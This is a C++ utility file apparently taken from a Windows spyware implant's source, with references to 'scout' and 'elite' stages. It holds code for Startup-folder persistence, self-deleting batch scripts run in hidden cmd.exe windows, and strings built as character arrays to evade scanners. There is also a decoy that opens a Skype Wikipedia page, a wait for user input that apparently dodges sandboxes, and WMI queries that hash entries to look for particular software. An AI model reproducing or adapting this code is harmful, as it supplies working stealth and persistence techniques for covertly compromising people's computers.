#include <Windows.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "binpatch.h"
#include "mayhem.h"
#include "proto.h"
#include "debug.h"
#include "JSON.h"
#include "crypt.h"

HKEY GetRegistryKeyHandle(__in HKEY hParentKey, __in LPWSTR strSubKey, __in DWORD dwSamDesidered)
{
	HKEY hKey;
	DWORD dwRet = RegOpenKeyEx(hParentKey, 
		strSubKey, 
		0, 
		dwSamDesidered, //bWrite ? KEY_QUERY_VALUE|KEY_SET_VALUE|KEY_CREATE_SUB_KEY|KEY_ENUMERATE_SUB_KEYS : KEY_QUERY_VALUE|KEY_ENUMERATE_SUB_KEYS,
		&hKey);

	if (dwRet != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] RegOpenKeyEx failed for %08x\\%s ==> %08x\n", hParentKey, strSubKey, GetLastError());
		__asm int 3;
#endif
		return NULL;
	}

	return hKey;
}

BOOL GetRegistryValue(__in HKEY hRootKey, __in LPWSTR strSubKey, __in LPWSTR strKeyName, __out LPVOID lpBuffer, __in DWORD dwBuffSize, __in DWORD dwSam)
{
	if (dwBuffSize)
		SecureZeroMemory(lpBuffer, dwBuffSize);

	HKEY hKey = GetRegistryKeyHandle(hRootKey, strSubKey, dwSam);
	if (hKey == NULL)
		return FALSE;

	DWORD dwLen = dwBuffSize;
	if (RegQueryValueEx(hKey, strKeyName, NULL, NULL, (LPBYTE) lpBuffer, &dwLen) != ERROR_SUCCESS)
	{
#ifdef _DEBUG
//		OutputDebug(L"[!!] GetRegistryValue: RegQueryValue => %08x\n", GetLastError());
//		__asm int 3;
#endif
		RegCloseKey(hKey);
		return FALSE;
	}

	RegCloseKey(hKey);
	return TRUE;
}

LPSTR GetEliteSharedMemoryName()
{
	LPSTR pName = (LPSTR) zalloc(8);
	memcpy(pName, WMARKER, 7); 
	return pName;
}

LPWSTR GetScoutSharedMemoryName()
{
	WCHAR strFormat[] = { L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'\0' };
	LPWSTR pName = (LPWSTR)zalloc(16 * sizeof(WCHAR));

	_snwprintf_s(pName, 
		16,
		_TRUNCATE,
		strFormat,
		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);

		//L"%02X%02X%02X%02X%02X%02X%02X", 
		//pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);

	return pName;
}

BOOL ExistsEliteSharedMemory()
{
	HANDLE hMem;
	LPSTR pName;
	BOOL bRet = FALSE;
	
	pName = GetEliteSharedMemoryName();
	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
	if (hMem)
	{
		bRet = TRUE;
		CloseHandle(hMem);
	}

	zfree(pName);
	return bRet;
}

BOOL ExistsScoutSharedMemory()
{
	HANDLE hMem;
	LPWSTR pName;
	BOOL uRet = FALSE;
	
	pName = GetScoutSharedMemoryName();
	hMem = OpenFileMapping(FILE_MAP_READ, FALSE, pName);

	if (hMem)
	{
		uRet = TRUE;
		CloseHandle(hMem);
	}

	zfree(pName);
	return uRet;
}


BOOL CreateScoutSharedMemory()
{
	BOOL bRet = FALSE;
	LPWSTR pName;
	
#ifdef _DEBUG
	OutputDebug(L"[+] Creating scout shared memory\n");
#endif
	if (ExistsScoutSharedMemory())
		return FALSE;

	pName = GetScoutSharedMemoryName();
	hScoutSharedMemory = CreateFileMapping(INVALID_HANDLE_VALUE, 
		NULL,
		PAGE_READWRITE,
		0,
		SHARED_MEMORY_WRITE_SIZE,
		pName);

	if (hScoutSharedMemory)
		bRet = TRUE;
	
	zfree(pName);
	return bRet;
}

BOOL CreateRegistryKey(HKEY hBaseKey, LPWSTR strSubKey, DWORD dwOptions, DWORD dwPermissions, PHKEY hOutKey)
{
	HKEY hKey;
	DWORD dwRet = RegCreateKeyEx(hBaseKey, strSubKey, 0, NULL, dwOptions, dwPermissions, NULL, &hKey, NULL); 
	if (dwRet != ERROR_SUCCESS)
		return FALSE;

	if (!hOutKey)
		RegCloseKey(hKey);
	else
		*hOutKey = hKey;

	return TRUE;
}

LPWSTR GetStartupPath()
{
	LPWSTR pStartupPath = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	LPWSTR pShortPath = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	
	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
	GetShortPathName(pStartupPath, pShortPath, MAX_FILE_PATH - 1);

	zfree(pStartupPath);
	return pShortPath;
}

LPWSTR GetStartupScoutName()
{
	LPWSTR pStartupPath = GetStartupPath();
	LPWSTR pFullPath = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	
	_snwprintf_s(pFullPath, MAX_FILE_PATH - 1, _TRUNCATE, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);

	zfree(pStartupPath);
	return pFullPath;
}

VOID IsX64System(__out PBOOL bIsWow64, __out PBOOL bIsx64OS)
{    
    SYSTEM_INFO SysInfo;
	IsWow64Process((HANDLE)-1, bIsWow64);

	GetNativeSystemInfo(&SysInfo);
	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		*bIsx64OS = FALSE;
	else
		*bIsx64OS = TRUE;

	return;
}

LPWSTR GetMySelfName()
{
	LPWSTR pName = (LPWSTR) zalloc((MAX_FILE_PATH*2+1) * sizeof(WCHAR));
	LPWSTR pShort = (LPWSTR) zalloc((MAX_FILE_PATH*2+1) * sizeof(WCHAR));
	
	GetModuleFileName(NULL, pName, MAX_FILE_PATH*2);
	if (!GetShortPathName(pName, pShort, MAX_FILE_PATH*2))
	{
		zfree(pShort);
		return pName;
	}

	zfree(pName);
	return pShort;
}

BOOL AmIFromStartup()
{
	BOOL uRet;
	
	LPWSTR pStartupPath = GetStartupPath();
	LPWSTR pCurrentPath = GetMySelfName();

	if (StrRChr(pCurrentPath, NULL, L'\\'))
		*(StrRChr(pCurrentPath, NULL, L'\\')) = L'\0';

	if (StrCmpI(pCurrentPath, pStartupPath))
		uRet = FALSE;
	else
		uRet = TRUE;
	
	zfree(pStartupPath);
	zfree(pCurrentPath);
	
	return uRet;
}

VOID MySleep(__in LONG dwTime) // dwTime MUST be signed
{
	if (!hScoutMessageWindow)
		return Sleep(dwTime * 1000);

	LARGE_INTEGER fTime;
	__int64 qwDueTime = ((dwTime * -1L)) * 10000000;
	fTime.LowPart = (DWORD) (qwDueTime & 0xFFFFFFFF);
	fTime.HighPart = (LONG) (qwDueTime >> 32);

	if (!hMsgTimer)
		hMsgTimer = CreateWaitableTimer(NULL, FALSE, L"MSG_TIMER");

	if (hMsgTimer && SetWaitableTimer(hMsgTimer, &fTime, 0, NULL, NULL, FALSE))
		WaitForSingleObject(hMsgTimer, INFINITE);
	else
		Sleep(dwTime * 1000);
}


LPWSTR GetTemp()
{
	LPWSTR pTemp = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	LPWSTR pShort = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	
	GetEnvironmentVariable(L"TMP", pTemp, MAX_FILE_PATH); // FIXME GetTempPath
	GetShortPathName(pTemp, pShort, 4096);
	
	zfree(pTemp);
	return pShort;
}

VOID DeleteAndDie(__in BOOL bDie)
{
	HANDLE hFile;
	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };

	if (hScoutSharedMemory)
	{
		CloseHandle(hScoutSharedMemory);	
		hScoutSharedMemory = NULL;
	}


	LPWSTR pTempPath = GetTemp();
	LPWSTR pBatFileName = (LPWSTR)zalloc(MAX_FILE_PATH * sizeof(WCHAR));

	ULONG uTick = GetTickCount();
	do
	{
		_snwprintf_s(pBatFileName, MAX_FILE_PATH, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFile(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while(1);

#ifdef _DEBUG
	OutputDebug(pBatFileName);
#endif

	// get full filename in startup
	LPWSTR pExeFileName = GetMySelfName();

	// create batch buffer
	ULONG uSize = strlen(batch_format) + 32676*3 + 1;
	LPSTR pBatchBuffer = (LPSTR) zalloc(uSize);
	memset(pBatchBuffer, 0x0, uSize);
	_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);

	// write it
	ULONG uOut;
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	if (StartBatch(pBatFileName))
	{
		if (bDie)
			ExitProcess(0);
		else
			return;
	}
#ifdef _DEBUG
	else
	{
		OutputDebug(L"[!!] Error executing autodelete batch!!\n");
		__asm int 3;
	}
#endif
	zfree(pBatFileName);
	zfree(pExeFileName);
	zfree(pBatchBuffer);
	zfree(pTempPath);

}


BOOL StartBatch(__in LPWSTR pName)
{
	BOOL bRet;
		
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPWSTR pApplicationName = (LPWSTR) zalloc(4096 * sizeof(WCHAR));
	WCHAR pTempInterpreter[] = { L'%', L'S', L'Y', L'S', L'T', L'E', L'M', L'R', L'O', L'O', L'T', L'%', L'\\', L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'c', L'm', L'd', L'.', L'e', L'x', L'e', 0x0 };
	LPWSTR pInterpreter = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));

	ExpandEnvironmentStrings(pTempInterpreter, pInterpreter, MAX_FILE_PATH * sizeof(WCHAR));
	_snwprintf_s(pApplicationName, 4095, _TRUNCATE, L"/c %s", pName);

	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	if (FakeConditionalVersion())
	{
		ShellExecute(NULL, L"open", L"http://en.wikipedia.org/wiki/Skype", NULL, NULL, SW_SHOWNORMAL);
		exit(0);
	}
	else
		bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	zfree(pApplicationName);
	zfree(pInterpreter);	
	return bRet;
}

VOID CreateCopyBatch(LPWSTR pSource, LPWSTR pDest, LPWSTR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick ,uOut;
	LPWSTR pTempPath = GetTemp();
	LPWSTR pBatchName = (LPWSTR) zalloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', '"', '%', 'S', '"', 0x0};
	PCHAR pBatchBuffer = (PCHAR) zalloc(strlen(pBatchFormat) + (32767 * 3));

	uTick = GetTickCount();
	do
	{
		WCHAR pName[] = { L'%', L's', L'\\', L'%', L'd', L'.', L'b', L'a', L't', L'\0' };
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, pName, pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pSource, pDest);
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	zfree(pBatchBuffer);
	zfree(pTempPath);
}

VOID CreateDeleteBatch(__in LPWSTR pFileName, __in LPWSTR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	LPWSTR pTempPath = GetTemp();
	LPWSTR pBatchName = (LPWSTR) zalloc(MAX_FILE_PATH*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	LPSTR pBatchBuffer = (LPSTR) zalloc(strlen(pBatchFormat) + (MAX_FILE_PATH * 3));
	
	uTick = GetTickCount();
	do
	{
		_snwprintf_s(pBatchName, MAX_FILE_PATH, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (MAX_FILE_PATH * 3), _TRUNCATE, pBatchFormat, pFileName, pFileName, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	zfree(pBatchBuffer);
	zfree(pTempPath);
}


VOID CreateReplaceBatch(__in LPWSTR pOldFile, __in LPWSTR pNewFile, __in LPWSTR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	LPWSTR pTempPath = GetTemp();
	LPWSTR pBatchName = (LPWSTR) zalloc(MAX_FILE_PATH*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', ' ', '"', '%', 'S', '"', '\r', '\n', 's', 't', 'a', 'r', 't', ' ', '/', 'B', ' ', 'c', 'm', 'd', ' ', '/', 'c', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	LPSTR pBatchBuffer = (LPSTR) zalloc(strlen(pBatchFormat) + (MAX_FILE_PATH * 3));

	uTick = GetTickCount();
	do
	{
		_snwprintf_s(pBatchName, MAX_FILE_PATH, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (MAX_FILE_PATH * 3), _TRUNCATE, pBatchFormat, pOldFile, pOldFile, pNewFile, pOldFile, pOldFile, pNewFile, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	zfree(pBatchBuffer);
	zfree(pTempPath);
}

HRESULT CreateItemFromParsingName(__in LPWSTR strFileName, __out  IShellItem **psi)
{
	PIDLIST_ABSOLUTE pidl;
	HRESULT hr = SHParseDisplayName(strFileName, 0, &pidl, SFGAO_FOLDER, 0);
	if (SUCCEEDED(hr))
	{
		hr = SHCreateShellItem(NULL, NULL, pidl, psi);
		if (SUCCEEDED(hr))
			return S_OK;
	}

	return E_FAIL;
}

VOID BatchCopyFile(__in LPWSTR pSource, __in LPWSTR pDest)
{
	LPWSTR pBatchName;
	
	CreateCopyBatch(pSource, pDest, &pBatchName);
	StartBatch(pBatchName);
	MySleep(8);

	DeleteFile(pBatchName);
	DeleteFile(pBatchName);
	
	zfree(pBatchName);
}

HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt LPWSTR strNewName)
{
	IFileOperation *pfo;
	HRESULT hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pfo));

	if (SUCCEEDED(hr))
	{
		hr = pfo->SetOperationFlags(FOF_NO_UI);
		if (SUCCEEDED(hr))
		{
			IShellItem *psiFrom = NULL;
			//hr = SHCreateItemFromParsingName(strSourceFile, NULL, IID_PPV_ARGS(&psiFrom));
			hr = CreateItemFromParsingName(strSourceFile, &psiFrom);

			if (SUCCEEDED(hr))
			{
				IShellItem *psiTo = NULL;
				if (NULL != strDestDir)
					hr = CreateItemFromParsingName(strDestDir, &psiTo);
					//hr = SHCreateItemFromParsingName(strDestDir, NULL, IID_PPV_ARGS(&psiTo));

				if (SUCCEEDED(hr))
				{
					hr = pfo->CopyItem(psiFrom, psiTo, strNewName, NULL);

					if (NULL != psiTo)
						psiTo->Release();
				}                   
				psiFrom->Release();
			}

			if (SUCCEEDED(hr))
				hr = pfo->PerformOperations(); // copy file
		}
		pfo->Release();
	}

	return hr;
}


VOID WaitForInput()
{
	ULONG uLastInput;
	LASTINPUTINFO pLastInputInfo;
	
#ifdef _DEBUG
	OutputDebug(L"[+] FIRST_WAIT\n");
#endif
	MySleep(WAIT_INPUT);

	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&pLastInputInfo);
	uLastInput = pLastInputInfo.dwTime;

	while (1)
	{
		pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
		if (GetLastInputInfo(&pLastInputInfo))
		{
			if (pLastInputInfo.dwTime != uLastInput)
				break;
		}
		else
		{
#ifdef _DEBUG
			OutputDebug(L"[+] GetLastInput FAILED\n");
			__asm int 3;
#endif
			MySleep(3);
			break;
		}

#ifdef _DEBUG
		OutputDebug(L"[+] Waiting for input...\n");
#endif
		MySleep(3);
	}
}

ULONG GetRandomInt(__in ULONG uMin, __in ULONG uMax)
{
	if (uMax < (ULONG) 0xFFFFFFFF)
		uMax++;

	return (rand()%(uMax-uMin))+uMin;
}

LPWSTR GetRandomStringW(__in ULONG uMin)
{
	LPWSTR pString = (LPWSTR) zalloc((uMin + 64) * sizeof(WCHAR));

	while(wcslen(pString) < uMin)
	{
		WCHAR pSubString[32] = { 0x0, 0x0 };

		_itow_s(GetRandomInt(1, 0xffffff), pSubString, 6, 0x10);
		wcscat_s(pString, uMin + 64, pSubString);
	}

	return pString;
}

LPSTR GetRandomStringA(__in ULONG uMin)
{
	LPSTR pString = (LPSTR) zalloc(uMin + 64);

	while(strlen(pString) < uMin)
	{
		CHAR pSubString[32] = { 0x0, 0x0 };

		_itoa_s(GetRandomInt(1, 0xffffff), pSubString, 6, 0x10);
		strcat_s(pString, uMin + 64, pSubString);
	}

	return pString;
}

LPBYTE GetRandomData(__in DWORD dwBuffLen)
{
	LPBYTE lpBuffer = (LPBYTE) zalloc(dwBuffLen);
	AppendRandomData(lpBuffer, dwBuffLen);
	return lpBuffer;
}

VOID AppendRandomData(PBYTE pBuffer, DWORD uBuffLen)
{
	DWORD i;
	static BOOL uFirstTime = TRUE;

	if (uFirstTime) {
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	for (i=0; i<uBuffLen; i++)
		pBuffer[i] = rand();
}

ULONG Align(__in ULONG uSize, __in ULONG uAlignment)
{
	return (((uSize + uAlignment - 1) / uAlignment) * uAlignment);
}

LPBYTE MapFile(LPWSTR strFileName, DWORD dwSharemode)
{
	HANDLE hFile = CreateFile(strFileName, GENERIC_READ, dwSharemode, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize == INVALID_FILE_SIZE || dwSize == 0)
	{
		CloseHandle(hFile);
		return NULL;
	}

	LPBYTE lpBuffer = (LPBYTE) zalloc(dwSize + sizeof(WCHAR));
	if (!lpBuffer)
	{
		CloseHandle(hFile);
		return NULL;
	}

	DWORD dwOut;
	if (!ReadFile(hFile, lpBuffer, dwSize, &dwOut, NULL))
	{
		CloseHandle(hFile);
		zfree(lpBuffer);
		return NULL;
	}
	CloseHandle(hFile);

	if (dwOut != dwSize)
	{
		zfree(lpBuffer);
		return NULL;
	}

	return lpBuffer;
}


VOID URLDecode(__in LPSTR strUrl)
{
	LPSTR strDecodedUrl = strUrl;
	CHAR strCharCode[3] = {0};
	DWORD dwAscii = 0;
	LPSTR strEnd = NULL;

	while(*strUrl) {
		if(*strUrl=='\\' && *(strUrl+1)=='u') {
			strUrl+=4;
			memcpy(strCharCode, strUrl, 2);
			dwAscii = strtoul(strCharCode, &strEnd, 16);
			*strDecodedUrl++ = (char)dwAscii;
			strUrl += 2;
		} else
			*strDecodedUrl++ = *strUrl++;
	}
	*strDecodedUrl = 0;
}

LPWSTR UTF8_2_UTF16(LPSTR strSource)
{
	DWORD dwLen;
	LPWSTR strDest;

	if ( (dwLen = MultiByteToWideChar(CP_UTF8, 0, strSource, -1, NULL, 0)) == 0 )
		return NULL;

	if (!(strDest = (WCHAR *) zalloc(dwLen*sizeof(WCHAR))))
		return NULL;

	if (MultiByteToWideChar(CP_UTF8, 0, strSource, -1, strDest, dwLen) == 0 ) {
		zfree(strDest);
		return NULL;
	}

	return strDest;
}

VOID JsonDecode(__in LPSTR strSource)
{
	WCHAR *strUTF16, *strPtr;
	DWORD size;
	std::wstring decode_16=L"";

	size = strlen(strSource);
	strPtr = strUTF16 = UTF8_2_UTF16(strSource);
	if (!strUTF16) 
		return;

	JSON::ExtractString((const wchar_t **)&strUTF16, decode_16);
	if (wcslen(decode_16.c_str())>0)
		WideCharToMultiByte(CP_UTF8, 0, decode_16.c_str(), -1, strSource, size, 0 , 0);

	zfree(strPtr);
}

LPWSTR CreateTempFile()
{
	WCHAR pTempPath[MAX_PATH + 1];
	LPWSTR pShortTempPath = (LPWSTR) zalloc((MAX_PATH + 1)*sizeof(WCHAR));
	LPWSTR pTempFileName = (LPWSTR) zalloc((MAX_PATH + 1)*sizeof(WCHAR));
	LPWSTR pShortTempFileName = (LPWSTR) zalloc((MAX_PATH + 1)*sizeof(WCHAR));
	
	memset(pTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pShortTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pShortTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));

	GetTempPath(MAX_PATH + 1, pTempPath);
	GetShortPathName(pTempPath, pShortTempPath, (MAX_PATH + 1)*sizeof(WCHAR));

	GetTempFileName(pTempPath, L"00", 0, pTempFileName);
	GetShortPathName(pTempFileName, pShortTempFileName, (MAX_PATH + 1)*sizeof(WCHAR));

	zfree(pShortTempPath);
	zfree(pTempFileName);
	
	return pShortTempFileName;
}



BOOL WMIExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar)
{
	BOOL bRet = FALSE;
	IEnumWbemClassObject *pEnum;
	
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);
	
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	BSTR bWQL = SysAllocString(strWQL);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;
		hr = pEnum->Next(5000, 1, &apObj, &uRet);
		if (hr == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr == WBEM_S_NO_ERROR)
				bRet = TRUE;

			apObj->Release();
		}
		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);
	
	return bRet;
}

BOOL WMIExecQuerySearchEntryHash(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField, LPBYTE pSearchHash, LPVARIANT lpVar)
{
	BOOL bFound = FALSE;
	IEnumWbemClassObject *pEnum;
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	
	BSTR bWQL = SysAllocString(strWQL);
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;

		while (pEnum->Next(5000, 1, &apObj, &uRet) == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr != WBEM_S_NO_ERROR ||  lpVar->vt != VT_BSTR)
				continue;

			BYTE pSha1Buffer[20];
			CalculateSHA1(pSha1Buffer, (LPBYTE)lpVar->bstrVal, 21*sizeof(WCHAR));
			if (!memcmp(pSha1Buffer, pSearchHash, 20))
				bFound = TRUE;

			apObj->Release();
		}

		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);

	return bFound;
}